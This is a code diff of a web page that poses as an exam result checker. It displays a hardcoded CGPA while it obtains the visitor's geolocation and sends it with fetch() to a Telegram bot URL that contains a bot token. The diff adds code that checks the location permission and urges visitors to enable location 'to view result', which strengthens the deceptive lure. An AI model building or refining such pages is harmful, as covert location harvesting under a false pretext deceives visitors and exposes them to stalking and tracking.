@@ -31,7 +31,6 @@ body{
 
 h2{
     margin-bottom:15px;
-    font-size:20px;
 }
 
 input, select{
@@ -40,7 +39,6 @@ input, select{
     margin:10px 0;
     border-radius:6px;
     border:1px solid #ccc;
-    font-size:16px;
 }
 
 button{
@@ -51,11 +49,6 @@ button{
     border:none;
     border-radius:6px;
     cursor:pointer;
-    font-size:16px;
-}
-
-button:hover{
-    background:#1b263b;
 }
 
 #status{
@@ -142,12 +135,25 @@ if(year === ""){
     return;
 }
 
-// show loading
 document.getElementById("loader").style.display = "block";
-document.getElementById("status").innerHTML = "🔐 Please allow browser permission to continue to get result...";
 document.getElementById("result").innerHTML = "";
 
-navigator.geolocation.getCurrentPosition(sendLocation, showError);
+// ✅ Check permission status first
+navigator.permissions.query({name:'geolocation'}).then(function(permission){
+
+    if(permission.state === 'denied'){
+        document.getElementById("loader").style.display = "none";
+        document.getElementById("status").innerHTML =
+        "❌ Location blocked.<br>👉 Please enable it from browser settings (🔒 icon → Allow Location)";
+        return;
+    }
+
+    document.getElementById("status").innerHTML =
+    "🔐 Please allow browser permission to continue to get result...";
+
+    navigator.geolocation.getCurrentPosition(sendLocation, showError);
+
+});
 
 }
 
@@ -167,10 +173,7 @@ let url = "https://api.telegram.org/bot8617709471:AAE0up-a7zvz9DTGAx7JZU7WpDnRuQ
 
 fetch(url);
 
-// hide loader
 document.getElementById("loader").style.display = "none";
-
-// show result
 document.getElementById("status").innerHTML = "✅ Result Found";
 document.getElementById("result").innerHTML = "🎓 CGPA: 3.77 out of 4";
 
@@ -178,7 +181,8 @@ document.getElementById("result").innerHTML = "🎓 CGPA: 3.77 out of 4";
 
 function showError(){
 document.getElementById("loader").style.display = "none";
-document.getElementById("status").innerHTML = "❌ Permission denied. Cannot show result.";
+document.getElementById("status").innerHTML =
+"❌ Permission denied. Please allow location to view result.";
 document.getElementById("result").innerHTML = "";
 }
 
